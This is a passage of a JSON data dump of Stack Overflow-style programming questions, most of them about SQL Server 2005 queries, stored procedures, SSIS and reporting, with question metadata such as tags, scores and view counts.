(nolock) on up_branch_id = b_id where           \n  up_user_name = @username and up_password =@pwd          \n END          \nEND\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","dbo"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1177,"score":2,"question_id":1330833,"title":"lu.[TableName] instead of dbo.[TableName]?","body":"<p>Some of the tables in my SQL Server 2005 database is named as lu.[TableName] instead of dbo.[TableName]. What does lu stand for? </p>\n\n<p>Note: I tried google already</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":5,"view_count":99,"score":-3,"question_id":12318452,"title":"SQL Server - Join Query","body":"<p>Here are my tables </p>\n\n<pre><code>  StudentID    Name\n    ----------   ------\n      1          Mary\n      2          John\n      3          Peter\n      4          Edwards\n\n   ClassID      StudentIDs\n    --------    -----------\n      1          1,2\n      2          3,4\n\n    **Output Expected**\n\n    ClassID   Names\n    -------   -------\n\n        1      Mary,John\n        2      Peter,Edwards\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":101,"score":3,"question_id":12319185,"title":"Using the dangerous IN clause in SQL","body":"<p>Why does SQL server behave this way. I am running this on SQL 2005.</p>\n\n<p>The IN clause does not validate the column names in the sub query but validates it\nagainst the table name in the outer query.  Here is an example of getting </p>\n\n<pre><code>Create table #table1(col1 int, col2 char(10), col3 char(15));\n\nCreate table #table2(col10 int, col11 char(10), col2 char(15));\n\n\ninsert into #table1(col1, col2, col3)\nselect 1, 'one', 'three'\n\ninsert into #table1(col1, col2, col3)\nselect 2, 'two', 'three'\n\ninsert into #table1(col1, col2, col3)\nselect 3, 'three', 'four'\n\n\ninsert into #table2(col10, col11, col2)\nselect 1, 'one', 'three'\n\ninsert into #table2(col10, col11, col2)\nselect 2, 'two', 'three'\n\ninsert into #table2(col10, col11, col2)\nselect 3, 'three', 'four'\n\n\nselect * from #table1\nwhere col1 IN\n(select col1 from #table2)\n</code></pre>\n\n<p>Where as if I just select the \"select col1 from #table2\" and run it spits an error</p>\n\n<pre><code>Msg 207, Level 16, State 1, Line 1\nInvalid column name 'col1'.\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12235392,"title":"automatically fill up values for missing date rows","body":"<p>I have a table similar to the following</p>\n\n<pre><code>Date   | qty1 | qty2 | qty3 | qty4 | column6\n1 july | 33   | 0    |  0   | 0    | xyz\n1 July | 0    | 20   | 0    | 0    | xyz\n1 July | 18   | 0    | 0    | 0    | abc\n3 July | 0    | 0    | 0    | 11   | abc\n3 july | 23   | 0    |  0   | 0    | xyz\n4 July | 0    | 40   | 0    | 0    | xyz\n4 July | 57   | 0    | 0    | 0    | abc\n7 July | 0    | 12   | 0    | 0    | xyz\n</code></pre>\n\n<p>And I'm looking for output as below in a stored procedure in sql server 2005.</p>\n\n<pre><code> Date   | qty1 | qty2 | qty3 | qty4 \n 1 July | 51   | 20   | 0    | 0 \n 2 July | 0    | 0    | 0    | 0\n 3 July | 23   | 0    | 0    | 11\n 4 July | 57   | 40   | 0    | 0\n 5 July | 0    | 0    | 0    | 0\n 6 July | 0    | 0    | 0    | 0\n 7 July | 0    | 12   | 0    | 0\n</code></pre>\n\n<p>As you notice, I want it to put automatically 0 values for missing date. I'm wondering if it's possible.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16585,"score":1,"question_id":5125609,"title":"How to select date without time in SQL","body":"<p>When I select date in SQL it is returned as  <code>2011-02-25 21:17:33.933</code>. But I need only the Date part, that is <code>2011-02-25</code>. How can I do this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12313687,"title":"Update table Error Using Convert Function In SQL Server 2005","body":"<p>I have a table with two columns, all of them are datetime value\nSuch as, Column A with value 07/09/2012 14:13:34\nNow, I want to update column A to yyyymmdd by statement</p>\n\n<pre><code> Update Change_Date\n    SET A = CONVERT(VARCHAR(8),A,112)\n</code></pre>\n\n<p>It shows succsessful message but with no effect (no update value to 20120907) in my table Change_Date.</p>\n\n<p>Any help will be greated, thank you!</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1915,"score":1,"question_id":2098759,"title":"SQL Server 2005 - Setting a column as readonly","body":"<p>I have a \"InsertTime\" field in a table in a SQL Server 2005 database which is defaulted to \"getDate()\" when the record is first inserted into the database.  I want to ensure that this column is not updated again.  </p>\n\n<p>Can this column be set to readonly or is there a better way to do this without writing all of the sql for the developers?</p>\n"},{"tags":["sql-server-2005","sql-update"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12314336,"title":"how to improve update performance in SQL server 2005?","body":"<p>I want to speed up my update in SQL server 2005. </p>\n\n<p><em>1.I have clustered the indexes used and dropped  unused ones.</em></p>\n\n<p><em>2.I have used join instead of sub query.</em></p>\n\n<p>Any other suggestion to improve the performance?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":136,"score":1,"question_id":8541329,"title":"Natural Sort in SQL Server 2005","body":"<p>I am using C# and SQL Server 2005.  I have a dataset with table numbers like so that I need to have a natural sort on:</p>\n\n<pre><code> 1\n 10\n 2\n I.1\n Table 1\n Table 2\n Table 10\n I.10\n I.2\n</code></pre>\n\n<p>Above is my numbers, and I want them to be sorted number first (1,2, ... , 10, 11), then by the alphabet (I.1, I.2, ... ,1.10, I.11, etc.) which would put Table 1, Table 2, ... , Table 10, ... at the end.</p>\n\n<p>Is there any way to do this with some funky SQL?</p>\n\n<p>(Note: I can't use a C# natural sort function as I can't load the entire dataset all at once.)</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":2,"view_count":91,"score":3,"question_id":12307471,"title":"Update a column where it is NULL","body":"<p>I have a table Person that contains a column isStaff (bit), that allows NULL values.</p>\n\n<p>The purpose is that this field must contains values 0/1; however, due to lack of application handling of user input in the first place, there are multiple records with the NULL value in this column.</p>\n\n<p>If I try to execute this query:</p>\n\n<pre><code>UPDATE Person\nSET isStaff = 0\nWHERE isStaff IS NULL\n</code></pre>\n\n<p>I get the error:</p>\n\n<blockquote>\n  <p><em>Subquery returned more than 1 value. This is not permitted when the subquery\n  follows =, !=, &lt;, &lt;= , >, >= or when the subquery is used as an expression.</em></p>\n</blockquote>\n\n<p>Any idea how to resolve this problem?</p>\n"},{"tags":["database","sql-server-2005","datamodel"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12307886,"title":"Data modeling revisited - clinging to old identities?","body":"<p>I've been revisiting why I've been doing certain things in SQL Server 2005 data modeling. </p>\n\n<p>I've habitually used identities for table keys, making unique indexes for the actual data that should be unique instead of keying off that.</p>\n\n<p>So, if I had a student table, I might have:</p>\n\n<pre><code>ID identity primary key,\nStudentIdentifier char(8)\n</code></pre>\n\n<p>I'd put a unique index on StudentIdentifier since this is the code that the university would use to reference a student, but I'd store Student.ID in any tables that referenced Student.</p>\n\n<p>Is using an autoNumber Identity field still a good practice in SQL Server (version 2005)?</p>\n\n<p>Also -</p>\n\n<p>I use int codes for lookup values and store those ints in the corresponding referencing tables.</p>\n\n<p>For example, I might have a workflow table like this:</p>\n\n<pre><code>id  statuscode      DESCRIPTION         \n1   CIProgress      CI Grade in Progress\n2   Finalized       Finalized           \n3   NeedsSingle     Needs Single Read   \n4   NeedsFirst      Needs First Read    \n5   SingleProgress  Single Read in Progress\n</code></pre>\n\n<p>In a table that had a workflow attribute, I'd store the id (1) and then join against the workflow table to get the statuscode or description.</p>\n\n<p>Is it okay to store the statuscode, for example, instead? How much efficiency am I gaining by using the int over a short code?</p>\n\n<p>I've seen a lot of implementations in the 15 years since I started coding, and it occurs to me that maybe i'm taking old \"rules\" to heart without thinking about practice.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":183,"score":3,"question_id":12100566,"title":"sort results by column not row","body":"<p>is it possible in SQL to sort by column and not by row? i do not need a basic ORDER BY statement, i know how those work (ie: order by column1, column2, etc).  </p>\n\n<p>basically trying to sort something like this:</p>\n\n<pre><code>column 1    column 2    column 3\n   1            0           3 \n</code></pre>\n\n<p>trying to sort to this:</p>\n\n<pre><code>column 3    column 1    column 2\n   3           1           0 \n</code></pre>\n\n<p>Is this even possible in SQL? preferably t-sql or anything that will run on sql server 2005</p>\n\n<p>ive been searching online for hours on this and no one even seems to want to ask this question. or i suck at searching.</p>\n\n<pre><code>   ; with numbered as\n   (\n     select SUM(OrderReceived) as c1, SUM(OrderOnHold) as c2, SUM(OrderConfirmed) as     c3,\n     row_number() over (order by employee) RecordNumber\n     from( SELECT \n\n\ne.FirstName+' '+e.LastName AS Employee\n,CASE WHEN oim.MilestoneID = 10 THEN 1 ELSE 0 END as OrderReceived\n,CASE WHEN oim.MilestoneID = 15 THEN 1 ELSE 0 END as OrderOnHold\n,CASE WHEN oim.MilestoneID = 20 THEN 1 ELSE 0 END as OrderConfirmed\nFROM OrderItems oi\n    JOIN Orders o on o.orderid = oi.orderid\n    JOIN OrderItemMilestones oim on oim.orderid = oi.orderid and oim.orderitemid     =     oi.orderitemid\n    JOIN Milestones m on m.milestoneid = oim.milestoneid\n    JOIN Employees e on e.username = oim.recordedbyuser\n    JOIN Clients cl on cl.clientid = o.clientid\nWHERE oim.MilestoneDate Between '2012-08-01' and '2012-08-05'\n    and e.terminationdate is null\n),\n\nordered as\n(\n select SUM(OrderReceived) as c1, SUM(OrderOnHold) as c2, SUM(OrderConfirmed) as c3,\n         row_number() over (partition by RecordNumber\n                           order by employee desc) rn\n    from numbered\n\n  unpivot (v for c in (c1, c2, c3)) u\n)\nselect RecordNumber,\n     [1] c1,\n     [2] c2,\n     [3] c3\n from \n (\n select RecordNumber,\n         v,\n         Rn\n    from ordered\n  ) o\n pivot (min(employee) for Rn in ([1], [2], [3])) p\n</code></pre>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12306589,"title":"Which process thread is calling a stored procedure","body":"<p>Is there a way to tell in SQL Server 2005 which process and thread made a call to some stored procedure? Preferably programmatically.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":116,"score":3,"question_id":12303795,"title":"How can I spread a value across multiple rows without a cursor?","body":"<p>Is there an easy way to spread a value across multiple rows?</p>\n\n<p>For example, my table contains</p>\n\n<pre>\nType      Invoiced    Paid    Current\nCharge    100         0       100\nCharge    100         0       100\nCharge    100         0       100\nPayment   0         250       0\nPayment   0          25       0\n</pre>\n\n<p>The data is imported this way, but I need to populate the <code>Current</code> and <code>Paid</code> columns with whatever they should be for that transaction based on the payment transactions that were also imported.</p>\n\n<p>Is there an easy way to write a query to determine the balance for the <code>Current</code> column for each record?</p>\n\n<p>For example, the 250 would apply 100 for the first two records and 50 to the next two, and the 25 would get applied to the last one, so the end result after updating the <code>Current</code> balance in my table should be:</p>\n\n<pre>\nType      Invoiced    Paid    Current\nCharge    100         100     0\nCharge    100         100     0\nCharge    100          75     25\nPayment   0           250     0\nPayment   0            25     0\n</pre>\n\n<p>I'd ideally like to do this with a single query instead of using a cursor to process each item individually. I've been trying to do it by using the <a href=\"http://msdn.microsoft.com/en-us/library/ms186734.aspx\" rel=\"nofollow\">Row_Number()</a> function and joining two subqueries, but I know I'm missing something here</p>\n\n<p>Here was my first attempt, which resulted in getting the running total of the current balance</p>\n\n<pre><code>;with cte(invoiced, paid, current)\nas (\n    select invoiced, paid, current\n        , row_number() over (order by datecreated)\n    from mytable\n)\n\nselect t1.invoiced, t1.paid, sum(t2.invoiced - t2.paid) as [current]\nfrom cte as t1\njoin cte as t2 on t1.number = t2.number and t2.rownum &lt;= t1.rownum\ngroup by t1.uid, t1.number, t1.rownum\norder by t1.rownum\n</code></pre>\n\n<p>Result:</p>\n\n<pre>\nInvoiced    Paid    Current\n100         0       100\n100         0       200\n100         0       300\n0         250       50\n0          25       25\n</pre>\n\n<p>I'm sure there's a way to do this, but right now my brain seems on strike and is refusing to come up with a solution.</p>\n"},{"tags":["performance","sql-server-2005","process","locking","trace"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12304331,"title":"blocked process trace - blocking process suspended","body":"<p>Below is part of the xml output of a SQL Server 2005 blocked process trace - that I have running for a client. This section of the xml represents data detailing the <strong>blocking</strong> process. This process says it is suspended meaning that is is waiting on another process, or resource before it can finish and it has been waiting for a number of minutes! Trace records similar to this occur over, and over again, but I cannot find another blocked process record in the trace, that shows this proccess being blocked by another process. </p>\n\n<p>So.. how can I find out what is causing this process to be suspended? </p>\n\n<p>I do know what SQL is being run (a SELECT statement), so I know the table that is being blocked  but I dont know what is blocking that table. Where would you go in looking for what is suspending this process? </p>\n\n<pre><code>&lt;process status=\"suspended\" waittime=\"254406\" spid=\"191\" sbid=\"0\" ecid=\"0\" priority=\"0\" transcount=\"1\" lastbatchstarted=\"2012-09-04T09:08:12.923\" lastbatchcompleted=\"2012-09-04T09:08:12.920\" clientapp=\"Sage Pro ERP version 7.4\" hostname=\"ZZZ-ZZ04\" hostpid=\"5960\" loginname=\"ZZZZ\" isolationlevel=\"read uncommitted (1)\" xactid=\"804301839\" currentdb=\"15\" lockTimeout=\"4294967295\" clientoption1=\"536870944\" clientoption2=\"128056\"&gt;\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n\n<p>--Thanks\nMike C.</p>\n"},{"tags":["sql-server-2005","schema"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12302158,"title":"Invalid Object Name in mssql 2005","body":"<p>We currently have an issue with our MSSQL 2005 database. We've recently undergone a migration from windows server 2003 to 2008. SQL Server has remained as 2005. I'm using SQL Server Management Studio to work on.</p>\n\n<p>All the tables in the database follow the format: [SCHEMA].[TABLE_NAME]</p>\n\n<p>When I enter the SQL:</p>\n\n<pre><code>SELECT * FROM [table_name]\n</code></pre>\n\n<p>I get the error message: Invalid object name '[table_name]'.</p>\n\n<p>If I type in:</p>\n\n<pre><code>SELECT * FROM [schema].[table_name]\n</code></pre>\n\n<p>This works fine. The username we log into the database with owns the schema which is prepended to all the table names.</p>\n\n<p>The problem is, we have 3rd party companies which have software which exports data from the database. 2 companies have now tried to run their exporters, however are getting the error 'Invalid object name'. The software is logging in with the username which owns the schema.</p>\n\n<p>My question is exactly the same as this one I've found on the internet:\n<a href=\"http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=99802\" rel=\"nofollow\">http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=99802</a></p>\n\n<p>However the answer on that question seems to be full of keywords rather than actual sentences which makes it very hard to understand.</p>\n\n<p>If anyone could help, it'd be greatly appreciated.</p>\n\n<p>Many thanks</p>\n\n<p>Phil</p>\n"},{"tags":["sql","sql-server","sql-server-2005","error-handling","foreign-key-relationship"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12296870,"title":"How to determine table row causing duplicate entry error in INSERT?","body":"<p><em>As I get a lot of answers trying to help me with getting around the error:\nI am mostly interested in a <strong>way to do error handling and to detect the table row creating an error</strong> than getting around my actual problem which I only use to illustrate what is coded in the stored procedure.</em></p>\n\n<hr>\n\n<p>I am doing an SQL Insert statement in a stored procedure for entries missing in the table:</p>\n\n<pre><code>INSERT INTO dbo.t1\n                      (col1, col2, col3, col4, col5)\n    SELECT DISTINCT col1, col2, col3, col4, col5\n    FROM         dbo.t2\n    WHERE     (NOT EXISTS\n                          (SELECT     col1, col2, col3, col4, col5\n                            FROM      t1 AS Table_1\n                            WHERE     (col1 = t2.col1) AND \n                                      (col2 = t2.col2) AND\n                                      (col3 = t2.col3) AND\n                                      (col4 = t2.col4) AND\n                                      (col5 = t2.col5))) AND\n                                       col2 = 'VALUE'\n</code></pre>\n\n<p>t1.col1 + t1.col2 and t1.col3 + t1.col4 have a foreign key relation to another table t3.col1 + t3.col2</p>\n\n<p>The stored procedure fails to finish throwing an error message that the foreign key relation has been violated; i.e. there are some entries missing in t3:</p>\n\n<blockquote>\n  <p>Msg 547, Level 16, State 0 [...] INSERT statement is in conflict with\n  FOREIGN-KEY [..]</p>\n</blockquote>\n\n<p><strong>What I would like to know is the TABLE ROW of t2 causing the error</strong>, optimally the values in this row. I googled quite a lot about SQL error handling, but only found examples providing the coding line raising the error - which is useless information for me...</p>\n\n<p>Any help appreciated</p>\n"}]}
{"total":14387,"page":9,"pagesize":100,"questions":[{"tags":["php","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12230185,"title":"select all values from dropdown list in php if nothing is selected","body":"<p>I have a sql stored procedure similar to below :</p>\n\n<pre><code>create procedure procedurename\ndeclare @startdate datetime, @enddate endtime, @field1 varchar(15) = null\n\nselect * from table1\nwhere field1 = @field1 or @field1 is null\nand date between @startdate and @enddate\n</code></pre>\n\n<p>And when I want to display all values from field1, i just ignore supplying parameter @field1 while executing as below </p>\n\n<pre><code>execute procedurename @startdate = '01/07/2012', @enddate = '31/07/2012'\n</code></pre>\n\n<p>Now I want to access the stored procedure in browser and I tried the code below but if I select \"select all\" option, it displays blank result.</p>\n\n<pre><code>&lt;?php\n$attr = 'selected=\"selected\"';  ?&gt;\n&lt;?php\n$field1= isset($_REQUEST['field1']) ? $_REQUEST['field1'] : null; ?&gt;\n&lt;select name=\"field1\" style=\"margin-bottom:3px;\"&gt; \n&lt;option&gt; select all &lt;/option&gt;\n&lt;option value=\"xyz\" &lt;?php echo $field1 == 'xyz' ? $attr : ''; ?&gt;&gt;xyz&lt;/option&gt;\n&lt;option value=\"abc\" &lt;?php echo $field1 == 'abc' ? $attr : ''; ?&gt;&gt;abc&lt;/option&gt;\n &lt;option value=\"def\" &lt;?php echo $field1 == 'def' ? $attr : ''; ?&gt;&gt;abc&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>So basically I want to it to select all values of field1 if I select \"select all\" from drop-down box.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","backup"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12288043,"title":"Copying a SQL Server database to another database","body":"<p>I have a database in SQL server 2005 that is called MyStaging and I made a blank one called MyStaging_bk.  I went to Backup MyStaging and then tried to restore in to MyStaging_bk. But it says I cannot restore since the backup sets are different.</p>\n\n<p>How do I copy db's and they are on the same database server?</p>\n"},{"tags":["c#","sql-server-2005","com-interop","stemming","wordbreaker"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12287801,"title":"How can I use the word breaker from Microsoft SQL Server 2005 in my stand-alone C# program","body":"<p>I am writing a program which will query a full text search index on Microsoft SQL Server 2005. The data being indexed are large blobs of text (multiple lines).</p>\n\n<p>I need to extract only those lines of text which contain the search words for display with the results.</p>\n\n<p>I therefore need to use the Sql Server word breaker and stemmer to determine if each line of text from the blob matches the search string, as I understand the standard word breaker and stemmer in Windows search uses a different algorithm.</p>\n\n<p>I thought if I copied the two dlls (infosoft and langwrbk) from a SQL Server installation to the machine on which I am running my program, and ran regsvr32 on them, they would be installed in the registry, and I would be able to use them.</p>\n\n<p>No such luck - running regsvr32 does not seem to add anything to the registry at all!</p>\n\n<p>I have code which does the job with the word breaker and stemmer that comes with Windows, and it works, but I'm worried about the differences (which I have seen complained about in other posts here).</p>\n"},{"tags":["sql-server-2005","stored-procedures","select"],"answer_count":2,"favorite_count":2,"up_vote_count":13,"down_vote_count":0,"view_count":16844,"score":13,"question_id":4647700,"title":"SQL Stored Procedure set variables using SELECT","body":"<p>I have a stored procedure in SQL Server 2005 with multiple variables and I want to set the values of these variables using a select statement. All three variables come from a same table and there should be a way to set them using one select statement instead of the way I currently have as shown below. Please help me to figure it out.</p>\n\n<pre><code>DECLARE @currentTerm nvarchar(max)\n\nDECLARE @termID int\n\nDECLARE @endDate datetime\n\nSET @currentTerm =\n(\n    Select CurrentTerm from table1 where IsCurrent = 1\n)\n\nSET @termID =\n(\n    Select TermID from table1 where IsCurrent = 1\n)\n\nSET @endDate =\n(\n    Select EndDate from table1 where IsCurrent = 1\n)\n</code></pre>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":279,"score":0,"question_id":1333373,"title":"How to send mails to Multiple mail ids selected dynamically using send mail task in SSIS?","body":"<p>I am using SSIS 2005 for creating package.\nI am having a requirement where I need to get data from database &amp; store it in a destination and retrieve only email ids from that store and send mails to each and every id that I have received.\nI am using Expressions in the send mail task where I am getting the mail ids from the record set store. But the task is unable to retrieve all those records and showing an error as <code>'No recipients in the Send mail task'</code>.</p>\n\n<p>Please suggest.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1063,"score":0,"question_id":2673673,"title":"Cannot resolve collation conflict in Union select","body":"<p>I've got two queries:</p>\n\n<p>First doesn't work:</p>\n\n<pre><code>select hotels.TargetCode as TargetCode from hotels\nunion all \nselect DuplicatedObjects.duplicatetargetCode as TargetCode \nfrom DuplicatedObjects where DuplicatedObjects.objectType=4\n</code></pre>\n\n<p>because I get error:</p>\n\n<pre><code>Cannot resolve collation conflict for column 1 in SELECT statement.\n</code></pre>\n\n<p>Second works:</p>\n\n<pre><code>select hotels.Code from hotels where hotels.targetcode is not null \nunion all \nselect DuplicatedObjects.duplicatetargetCode as Code \nfrom DuplicatedObjects where DuplicatedObjects.objectType=4 \n</code></pre>\n\n<p>Structure: </p>\n\n<pre><code>Hotels.Code -PK nvarchar(40)\nHotels.TargetCode - nvarchar(100)\n\nDuplicatedObjects.duplicatetargetCode PK nvarchar(100)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12293582,"title":"Removing Space from Stored Table row with Procedure in SQL","body":"<p>I was looking for a stored procedure for SQL server 2005 to remove leading, trailing and other spaces of records stored in the table.</p>\n\n<p>Basically, I needed to bulk insert data into my Database, and the table that I am working on contains blank spaces in various records. Take an instance of Pincode/Zip code, that cannot have spaces between them but the data I have inserted had spaces in most of the pincodes like \"<strong>110 001</strong>\", however it should be \"<strong>110001</strong>\". In other columns the data is in form of \" <strong>data</strong> \" where it should be \"<strong>data</strong>\"</p>\n\n<p>I have already inserted the data but, I need to format it now, so as to arrange it in proper form.</p>\n"},{"tags":["sql-server","sql-server-2005","service","reporting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12262167,"title":"How to create a column/rows report in SQL 2005 Reporting Services?","body":"<p>In SQL Reporting Services 2005 SP3, we have the following tabular report:</p>\n\n<pre><code>JobName       Product      Weight Processed      Start                 End\n---------------------------------------------------------------------------------------\n2284          30mm         128 kg                11:55 04/09/2012      14:34 04/09/2012\n3686          15mm         234 kg                19:21 03/09/2012      00:23 04/09/2012\n</code></pre>\n\n<p>We want to convert this into a columns/rows type report, e.g.:</p>\n\n<pre><code>JobName                  2284                3686\n-------------------------------------------------------------\nProduct                  30mm                15mm\nWeight Processed         128 kg              234 kg\nStart                    11:55 04/09/2012    19:21 03/09/2012 \nEnd                      14:34 04/09/2012    00:23 04/09/2012\n</code></pre>\n\n<p>How can we do this in SRS 2005?  We originally created the report as 'tabular' using the wizard.  We've tried using the matrix style and have selected JobName as the column and the rest of the fields as the rows, but it doesn't let us proceed without an entry in Details, but this view isn't giving us what we want.  It's listing the JobName repeating as columns but not listing the other fields as rows underneath.</p>\n\n<p>Can anyone help on how we need to set up the report?\nThanks</p>\n"},{"tags":["sql","sql-server-2005","ssis","null"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1489,"score":1,"question_id":4620755,"title":"How do I retain NULL values when using SSIS to import from flat file in SQL Server 2005","body":"<p>I've exported records to a flat file delimited by \"|\" and it seems that when I import those records into a new database , SQL Server treats the NULL values as empty fields. IMy queries worked properly when the records/fields were NULL and so I want to either find a way to retain the NULL values in the data or convert the blank fields to NULL values. I'm assuming the former would be easier, but I don't know how to do that. Any help would be appreciated.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12283812,"title":"Name of the calling stored procedure with @@nestlevel = 1","body":"<p>I have a stored procedure which is nested in several other stored procedure. Is there a way to tell (inside the internal stored procedure) which is the caller?</p>\n\n<pre><code>CREATE PROC int_proc \nAS\n\nSELECT int_name = OBJECT_NAME(@@PROCID)\n      ,ext_name = 'How can I tell which is the ext_proc name?'\n      ,nestlevel = @@NESTLEVEL\n\nGO\nCREATE PROC ext_proc1\nAS\nSELECT ext_name = OBJECT_NAME(@@PROCID),nestlevel = @@NESTLEVEL\nEXECUTE int_proc\n\nGO\nCREATE PROC ext_proc2\nAS\nSELECT ext_name = OBJECT_NAME(@@PROCID),nestlevel = @@NESTLEVEL\nEXECUTE int_proc\n\nGO\n\nEXEC ext_proc1\nEXEC ext_proc2\n</code></pre>\n\n<p>I'm using SQL-Server 2005</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":102,"score":-1,"question_id":12267110,"title":"How to build this sql query","body":"<p>i want to find the records in sql\nfrom say 25-08-2012 to 01-09-2012\nand i want to group by date</p>\n\n<p>here is my query</p>\n\n<pre><code>SELECT CONVERT(VARCHAR(10), date, 105) AS dt,\nCOUNT(id) AS cnt\nFROM tablename\nWHERE date BETWEEN CONVERT(DATETIME, '21-08-2012 00:00:00:000',103)\nAND CONVERT(DATETIME, '01-09-2012 23:59:00:000' ,103)\nGROUP BY CONVERT(VARCHAR(10), date, 105)\n</code></pre>\n\n<p>i am getting result as</p>\n\n<pre><code>dt                 cnt\n01-09-2012         48\n27-08-2012         1\n28-08-2012         3\n29-08-2012         11\n30-08-2012         3\n</code></pre>\n\n<p>but expect it as</p>\n\n<pre><code>dt                 cnt\n25-08-2012          0\n26-08-2012          0\n01-09-2012          48\n27-08-2012          1\n28-08-2012          3\n29-08-2012         11\n30-08-2012          3\n</code></pre>\n\n<p>How i can modify above query\ni also tried with CASE but no luck</p>\n\n<p>Many Thanks..</p>\n"},{"tags":["sql-server-2005","table-valued-parameters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12280381,"title":"SQL Server table valued function parameter","body":"<p>I got following table valued function (in SQL Server 2005). I got an compile error when I run --1, but --3 is ok, --2 is used to generate the parameters to be used in --3, which should be the same as in --1. But why --1 got the error?</p>\n\n<pre><code>create function test_udf_nz_2 (\n    @a datetime\n    ,@b datetime\n)\nreturns @result TABLE(\n    c1 datetime\n    ,c2 datetime\n)\nas\nbegin\n    insert into @result\n    select @a, @b\n    return\nend\n\n\ndeclare\n    @dt_report_date DATETIME \n    ,@v_stores VARCHAR(MAX) \n\nselect @dt_report_date = '20120831'\n        ,@v_stores = '152'\n--1\nselect * from dbo.test_udf_nz_2( DATEADD(hour,0,DATEDIFF(d,0,@dt_report_date)), DATEADD(hour,24,DATEDIFF(d,0,@dt_report_date))) AS t\n\n--2\n--select DATEADD(hour,0,DATEDIFF(d,0,@dt_report_date)), DATEADD(hour,24,DATEDIFF(d,0,@dt_report_date))\n\n--3\nselect * from dbo.test_udf_nz_2( '20120831', '20120901') AS t\n</code></pre>\n"},{"tags":["sql-server-2005","asp.net-4.0","asp.net-4.5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12279943,"title":"How to create the charts in ASP.NET 4.0 using database","body":"<p>I want to create the charts in asp.net 4.0 using the database tables. i am using the charts control in that is present in visual studio 2010 but the output is not coming on the browser.</p>\n"},{"tags":["java","hibernate","sql-server-2005","jpa","spring-roo"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":86,"score":1,"question_id":12266094,"title":"Spring Roo JPA - Why are manual DB updates automatically available in Persistence Context?","body":"<p>I have developed a web app using Spring Roo (Spring MVC 3), JPA 1, Hibernate, JSTL, JQUERY etc..Persistence Contexts are application managed via a JPA Transaction manager. DB used is MSSQL2005. The application is running on JBOSS 5.</p>\n\n<p>Everything works fine. My question is something that has been on my mind, yet i have yet to come across a suitable answer.</p>\n\n<p>Suppose the following:</p>\n\n<ol>\n<li>I retrieve some row from Table T using entitymanager.find(), and present the data to a page</li>\n<li>I manually change one of the field values in the row (via SQL an gui tool).</li>\n<li>I immediately repeat step (1), and I have the manually updated value available.</li>\n</ol>\n\n<p>Is this correct? My understanding was that values within the persistence context do not get updated unless:</p>\n\n<ul>\n<li>calling em.refesh()</li>\n<li>object is not available in PERSISTENCE CONTEXT (--> query DB 